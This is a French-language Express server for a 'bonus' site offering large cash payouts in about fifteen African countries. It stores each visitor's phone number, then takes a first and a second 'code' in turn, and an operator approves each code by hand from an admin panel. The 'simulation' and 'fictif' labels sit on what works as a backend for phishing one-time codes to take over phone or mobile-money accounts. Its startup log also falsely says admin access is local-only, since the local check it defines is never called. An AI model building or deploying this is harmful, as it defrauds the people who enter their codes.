// ============================================
// FUNTONE BONUS INTERNATIONAL
// BACKEND - SERVEUR PRINCIPAL
// ============================================

const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

const app = express();

// Serveur local uniquement
const PORT = process.env.PORT || 3000;
const HOST = "0.0.0.0";

// ============================================
// CONFIGURATION
// ============================================

const FRONTEND = path.join(__dirname, "../Frontend");
const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "participations.json");

const SESSION_DURATION = 2 * 60 * 60 * 1000;

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, "[]", "utf8");
}

// ============================================
// PAYS ET BONUS FICTIFS
// ============================================

const PAYS = {
    CM: {
        nom: "Cameroun",
        indicatif: "+237",
        devise: "XAF",
        bonus: 100000
    },

    CD: {
        nom: "RDC",
        indicatif: "+243",
        devise: "USD",
        bonus: 200
    },

    CG: {
        nom: "Congo-Brazzaville",
        indicatif: "+242",
        devise: "XAF",
        bonus: 100000
    },

    CI: {
        nom: "Côte d'Ivoire",
        indicatif: "+225",
        devise: "XOF",
        bonus: 100000
    },

    SN: {
        nom: "Sénégal",
        indicatif: "+221",
        devise: "XOF",
        bonus: 100000
    },

    GA: {
        nom: "Gabon",
        indicatif: "+241",
        devise: "XAF",
        bonus: 100000
    },

    BF: {
        nom: "Burkina Faso",
        indicatif: "+226",
        devise: "XOF",
        bonus: 100000
    },

    ML: {
        nom: "Mali",
        indicatif: "+223",
        devise: "XOF",
        bonus: 100000
    },

    TG: {
        nom: "Togo",
        indicatif: "+228",
        devise: "XOF",
        bonus: 100000
    },

    BJ: {
        nom: "Bénin",
        indicatif: "+229",
        devise: "XOF",
        bonus: 100000
    },

    GN: {
        nom: "Guinée",
        indicatif: "+224",
        devise: "GNF",
        bonus: 1500000
    },

    NG: {
        nom: "Nigeria",
        indicatif: "+234",
        devise: "NGN",
        bonus: 155000
    },

    GH: {
        nom: "Ghana",
        indicatif: "+233",
        devise: "GHS",
        bonus: 650
    },

    KE: {
        nom: "Kenya",
        indicatif: "+254",
        devise: "KES",
        bonus: 10000
    },

    ZA: {
        nom: "Afrique du Sud",
        indicatif: "+27",
        devise: "ZAR",
        bonus: 60000
    }
};

// ============================================
// MIDDLEWARE
// ============================================

app.use(express.json({
    limit: "20kb"
}));

// ============================================
// GESTION DES PARTICIPATIONS
// ============================================

function lireParticipations() {

    const contenu = fs.readFileSync(
        DATA_FILE,
        "utf8"
    );

    const donnees = JSON.parse(contenu);

    if (!Array.isArray(donnees)) {
        throw new Error("Format de données invalide.");
    }

    return donnees;
}

function sauvegarderParticipations(donnees) {

    fs.writeFileSync(
        DATA_FILE,
        JSON.stringify(donnees, null, 2),
        "utf8"
    );
}

// ============================================
// RECHERCHER UNE PARTICIPATION
// ============================================

function trouverParticipation(participations, reference) {

    return participations.find(
        p => p.reference === reference
    );
}

// ============================================
// VALIDATION DES CODES FICTIFS
// ============================================

function codeFictifValide(code) {

    return typeof code === "string" &&
        code.trim().length >= 1 &&
        code.trim().length <= 100;
}

// ============================================
// VÉRIFICATION DE L'ACCÈS LOCAL
// ============================================

function estAccesLocal(req) {

    const adresse = req.socket.remoteAddress || "";

    const local =
        adresse === "127.0.0.1" ||
        adresse === "::1" ||
        adresse.startsWith("::ffff:127.");

    const accesProxy =
        req.headers["x-forwarded-for"] ||
        req.headers["x-forwarded-proto"] ||
        req.headers["cf-connecting-ip"] ||
        req.headers["cf-ray"];

    return local && !accesProxy;
}

// ============================================
// SESSIONS ADMINISTRATEUR
// ============================================

const sessions = new Map();

function nettoyerSessions() {

    const maintenant = Date.now();

    for (const [identifiant, session] of sessions) {

        if (session.expiration < maintenant) {
            sessions.delete(identifiant);
        }
    }
}

// ============================================
// LECTURE DES COOKIES
// ============================================

function obtenirCookie(req, nom) {

    const cookies = req.headers.cookie || "";

    const elements = cookies.split(";");

    for (const element of elements) {

        const partie = element.trim();

        const position = partie.indexOf("=");

        if (position === -1) continue;

        const cle = partie.substring(0, position);

        const valeur = partie.substring(position + 1);

        if (cle === nom) {
            return valeur;
        }
    }

    return null;
}

// ============================================
// RÉCUPÉRER LA SESSION
// ============================================

function obtenirSession(req) {

    nettoyerSessions();

    const identifiant = obtenirCookie(
        req,
        "admin_session"
    );

    if (!identifiant) {
        return null;
    }

    const session = sessions.get(identifiant);

    if (!session) {
        return null;
    }

    if (session.expiration < Date.now()) {

        sessions.delete(identifiant);

        return null;
    }

    return session;
}

// ============================================
// PROTECTION DE L'ADMINISTRATION
// ============================================

function protegerAdmin(req, res, next) {

    res.setHeader("Cache-Control", "no-store");

    const session = obtenirSession(req);

    if (!session) {

        return res.status(401).json({
            success: false,
            message: "Connexion administrateur requise."
        });
    }

    next();
}

// ============================================
// STATUT DU SERVEUR
// ============================================

app.get("/api", (req, res) => {

    res.json({
        success: true,
        message: "Funtone Bonus International fonctionne.",
        mode: "simulation"
    });
});

// ============================================
// INSCRIPTION DES PARTICIPANTS
// ============================================

app.post("/api/participations", (req, res) => {

    try {

        const { pays, telephone } = req.body;

        if (!pays || !telephone) {

            return res.status(400).json({
                success: false,
                message: "Informations manquantes."
            });
        }

        const informationsPays = PAYS[pays];

        if (!informationsPays) {

            return res.status(400).json({
                success: false,
                message: "Pays non reconnu."
            });
        }

        const numero = String(telephone).replace(/\D/g, "");

        if (!/^\d{6,15}$/.test(numero)) {

            return res.status(400).json({
                success: false,
                message: "Numéro de téléphone invalide."
            });
        }

        const participations = lireParticipations();

        const reference =
            "DEMO-" +
            Date.now().toString(36).toUpperCase() +
            crypto.randomBytes(3).toString("hex").toUpperCase();

        const nouvelleParticipation = {

            reference: reference,

            pays: pays,

            nomPays: informationsPays.nom,

            indicatif: informationsPays.indicatif,

            telephone: numero,

            bonus: informationsPays.bonus,

            devise: informationsPays.devise,

            statut: "simulation_en_attente",

            codes: {
                premier: null,
                second: null
            },

            date: new Date().toISOString()
        };

        participations.push(nouvelleParticipation);

        sauvegarderParticipations(participations);

        return res.status(201).json({

            success: true,

            message: "Participation fictive enregistrée.",

            reference: reference
        });

    } catch (erreur) {

        console.error("Erreur inscription :", erreur);

        return res.status(500).json({

            success: false,

            message: "Erreur lors de l'enregistrement."
        });
    }
});

// ============================================
// ENVOI DU PREMIER CODE FICTIF
// ============================================

app.post("/api/demo-codes/premier", (req, res) => {

    try {

        const { reference, code } = req.body;

        if (!reference || !code) {

            return res.status(400).json({
                success: false,
                message: "Référence ou code manquant."
            });
        }

        if (!codeFictifValide(code)) {

    return res.status(400).json({
        success: false,
        message: "Code invalide. Saisissez entre 1 et 100 caractères."
    });
        }

        const participations = lireParticipations();

        const participation = trouverParticipation(
            participations,
            reference
        );

        if (!participation) {

            return res.status(404).json({
                success: false,
                message: "Participation introuvable."
            });
        }

        if (!participation.codes) {
            participation.codes = {
                premier: null,
                second: null
            };
        }

        const precedent = participation.codes.premier;

        if (precedent && precedent.statut === "simulation_acceptee") {

            return res.status(409).json({
                success: false,
                message: "Le premier code a déjà été accepté."
            });
        }

        if (precedent && precedent.statut === "simulation_en_attente") {

            return res.status(409).json({
                success: false,
                message: "Votre premier code est déjà en attente de validation."
            });
        }

        participation.codes.premier = {

            valeur: code,

            statut: "simulation_en_attente",

            date: new Date().toISOString(),

            dateModification: null
        };

        sauvegarderParticipations(participations);

        return res.status(201).json({

            success: true,

            message: "Premier code fictif transmis pour validation.",

            statut: "simulation_en_attente"
        });

    } catch (erreur) {

        console.error("Erreur premier code :", erreur);

        return res.status(500).json({

            success: false,

            message: "Impossible de transmettre le premier code."
        });
    }
});

// ============================================
// CONSULTER LE STATUT DU PREMIER CODE
// ============================================

app.get("/api/demo-codes/premier/:reference", (req, res) => {

    try {

        const participations = lireParticipations();

        const participation = trouverParticipation(
            participations,
            req.params.reference
        );

        if (!participation) {

            return res.status(404).json({
                success: false,
                message: "Participation introuvable."
            });
        }

        const premier = participation.codes
            ? participation.codes.premier
            : null;

        return res.json({

            success: true,

            statut: premier ? premier.statut : "non_envoye"
        });

    } catch (erreur) {

        console.error("Erreur statut premier code :", erreur);

        return res.status(500).json({

            success: false,

            message: "Impossible de consulter le statut."
        });
    }
});
// ============================================
// ENVOI DU DEUXIÈME CODE FICTIF
// ============================================

app.post("/api/demo-codes/second", (req, res) => {

    try {

        const { reference, code } = req.body;

        if (!reference || !code) {

            return res.status(400).json({
                success: false,
                message: "Référence ou code manquant."
            });
        }

        if (!codeFictifValide(code)) {

    return res.status(400).json({
        success: false,
        message: "Code invalide. Saisissez entre 1 et 100 caractères."
    });
        }

        const participations = lireParticipations();

        const participation = trouverParticipation(
            participations,
            reference
        );

        if (!participation) {

            return res.status(404).json({
                success: false,
                message: "Participation introuvable."
            });
        }

        if (
            !participation.codes ||
            !participation.codes.premier ||
            participation.codes.premier.statut !== "simulation_acceptee"
        ) {

            return res.status(403).json({
                success: false,
                message: "Le premier code doit être accepté avant cette étape."
            });
        }

        const precedent = participation.codes.second;

        if (precedent && precedent.statut === "simulation_acceptee") {

            return res.status(409).json({
                success: false,
                message: "Le deuxième code a déjà été accepté."
            });
        }

        if (precedent && precedent.statut === "simulation_en_attente") {

            return res.status(409).json({
                success: false,
                message: "Votre deuxième code est déjà en attente de validation."
            });
        }

        participation.codes.second = {

            valeur: code,

            statut: "simulation_en_attente",

            date: new Date().toISOString(),

            dateModification: null
        };

        sauvegarderParticipations(participations);

        return res.status(201).json({

            success: true,

            message: "Deuxième code fictif transmis pour validation.",

            statut: "simulation_en_attente"
        });

    } catch (erreur) {

        console.error("Erreur deuxième code :", erreur);

        return res.status(500).json({

            success: false,

            message: "Impossible de transmettre le deuxième code."
        });
    }
});

// ============================================
// CONSULTER LE STATUT DU DEUXIÈME CODE
// ============================================

app.get("/api/demo-codes/second/:reference", (req, res) => {

    try {

        const participations = lireParticipations();

        const participation = trouverParticipation(
            participations,
            req.params.reference
        );

        if (!participation) {

            return res.status(404).json({
                success: false,
                message: "Participation introuvable."
            });
        }

        const second = participation.codes
            ? participation.codes.second
            : null;

        return res.json({

            success: true,

            statut: second ? second.statut : "non_envoye"
        });

    } catch (erreur) {

        console.error("Erreur statut deuxième code :", erreur);

        return res.status(500).json({

            success: false,

            message: "Impossible de consulter le statut."
        });
    }
});

// ============================================
// ACCÈS AU TABLEAU ADMINISTRATEUR
// ============================================

app.get("/admin.html", (req, res) => {

    res.setHeader("Cache-Control", "no-store");

    return res.sendFile(
        path.join(FRONTEND, "admin.html")
    );
});

// ============================================
// CONNEXION ADMINISTRATEUR
// ============================================

app.post("/api/admin/login", (req, res) => {

    const motDePasse = process.env.ADMIN_PASSWORD;

    if (!motDePasse || motDePasse.length < 16) {

        return res.status(503).json({
            success: false,
            message: "Configuration administrateur indisponible."
        });
    }

    const fourni = typeof req.body.password === "string"
        ? req.body.password
        : "";

    const attenduBuffer = Buffer.from(motDePasse);
    const fourniBuffer = Buffer.from(fourni);

    if (
        fourniBuffer.length !== attenduBuffer.length ||
        !crypto.timingSafeEqual(fourniBuffer, attenduBuffer)
    ) {

        return res.status(401).json({
            success: false,
            message: "Mot de passe incorrect."
        });
    }

    const identifiant = crypto.randomBytes(32).toString("hex");

    sessions.set(identifiant, {
        expiration: Date.now() + SESSION_DURATION
    });

    const secure = process.env.NODE_ENV === "production"
        ? "; Secure"
        : "";

    res.setHeader(
        "Set-Cookie",
        "admin_session=" + identifiant +
        "; HttpOnly; SameSite=Strict; Path=/; Max-Age=7200" +
        secure
    );

    res.setHeader("Cache-Control", "no-store");

    return res.json({
        success: true,
        authenticated: true,
        message: "Connexion réussie."
    });
});

// ============================================
// VÉRIFICATION DE LA SESSION
// ============================================

app.get(
    "/api/admin/me",
    protegerAdmin,
    (req, res) => {

        return res.json({

            success: true,

            authenticated: true
        });
    }
);

// ============================================
// DÉCONNEXION ADMINISTRATEUR
// ============================================

app.post(
    "/api/admin/logout",
    protegerAdmin,
    (req, res) => {

        const identifiant = obtenirCookie(
            req,
            "admin_session"
        );

        if (identifiant) {
            sessions.delete(identifiant);
        }

        res.setHeader(
            "Set-Cookie",

            "admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0"
        );

        return res.json({

            success: true,

            message: "Déconnexion réussie."
        });
    }
);

// ============================================
// LISTE DES PARTICIPATIONS
// ROUTE PROTÉGÉE
// ============================================

app.get(
    "/api/admin/participations",
    protegerAdmin,
    (req, res) => {

        try {

            const participations = lireParticipations();

            res.setHeader("Cache-Control", "no-store");

            return res.json({

                success: true,

                participations: participations
            });

        } catch (erreur) {

            console.error("Erreur lecture :", erreur);

            return res.status(500).json({

                success: false,

                message: "Impossible de lire les participations."
            });
        }
    }
);

// ============================================
// MODIFICATION DU STATUT D'UN CODE
// ROUTE PROTÉGÉE
// ============================================

app.patch(
    "/api/admin/participations/:reference/codes/:etape/status",
    protegerAdmin,
    (req, res) => {

        try {

            const reference = req.params.reference;
            const etape = req.params.etape;
            const nouveauStatut = req.body.status;

            const etapesAutorisees = [
                "premier",
                "second"
            ];

            const statutsAutorises = [
                "simulation_acceptee",
                "simulation_rejetee"
            ];

            if (!etapesAutorisees.includes(etape)) {

                return res.status(400).json({

                    success: false,

                    message: "Étape inconnue."
                });
            }

            if (!statutsAutorises.includes(nouveauStatut)) {

                return res.status(400).json({

                    success: false,

                    message: "Statut non autorisé."
                });
            }

            const participations = lireParticipations();

            const participation = trouverParticipation(
                participations,
                reference
            );

            if (!participation) {

                return res.status(404).json({

                    success: false,

                    message: "Participation introuvable."
                });
            }

            if (
                !participation.codes ||
                !participation.codes[etape]
            ) {

                return res.status(404).json({

                    success: false,

                    message: "Aucun code à valider pour cette étape."
                });
            }

            if (
                etape === "second" &&
                (
                    !participation.codes.premier ||
                    participation.codes.premier.statut !== "simulation_acceptee"
                )
            ) {

                return res.status(403).json({

                    success: false,

                    message: "Le premier code doit être accepté."
                });
            }

            participation.codes[etape].statut = nouveauStatut;

            participation.codes[etape].dateModification =
                new Date().toISOString();

            sauvegarderParticipations(participations);

            return res.json({

                success: true,

                message: "Décision enregistrée.",

                reference: reference,

                etape: etape,

                statut: nouveauStatut
            });

        } catch (erreur) {

            console.error("Erreur validation code :", erreur);

            return res.status(500).json({

                success: false,

                message: "Impossible de modifier le statut du code."
            });
        }
    }
);

// ============================================
// MODIFICATION DU STATUT GLOBAL
// ROUTE PROTÉGÉE
// ============================================

app.patch(
    "/api/admin/participations/:reference/status",
    protegerAdmin,
    (req, res) => {

        try {

            const reference = req.params.reference;

            const nouveauStatut = req.body.status;

            const statutsAutorises = [

                "simulation_acceptee",

                "simulation_rejetee"
            ];

            if (!statutsAutorises.includes(nouveauStatut)) {

                return res.status(400).json({

                    success: false,

                    message: "Statut non autorisé."
                });
            }

            const participations = lireParticipations();

            const index = participations.findIndex(
                p => p.reference === reference
            );

            if (index === -1) {

                return res.status(404).json({

                    success: false,

                    message: "Participation introuvable."
                });
            }

            participations[index].statut = nouveauStatut;

            participations[index].dateModification =
                new Date().toISOString();

            sauvegarderParticipations(participations);

            return res.json({

                success: true,

                message: "Statut fictif modifié.",

                participation: participations[index]
            });

        } catch (erreur) {

            console.error("Erreur modification :", erreur);

            return res.status(500).json({

                success: false,

                message: "Impossible de modifier le statut."
            });
        }
    }
);

// ============================================
// FICHIERS FRONTEND
// ============================================

app.use(express.static(FRONTEND));

// ============================================
// DÉMARRAGE DU SERVEUR
// ============================================

app.listen(PORT, HOST, () => {

    console.log("------------------------------------");

    console.log(" FUNTONE BONUS INTERNATIONAL");

    console.log("------------------------------------");

    console.log("Serveur lancé sur le port " + PORT);

    console.log("Mode : simulation uniquement");

    console.log("Frontend : " + FRONTEND);

    console.log("Administration : accès local uniquement");

    console.log("------------------------------------");

    console.log(
        "Accueil : http://127.0.0.1:3000/"
    );

    console.log(
        "Administration : http://127.0.0.1:3000/admin.html"
    );
});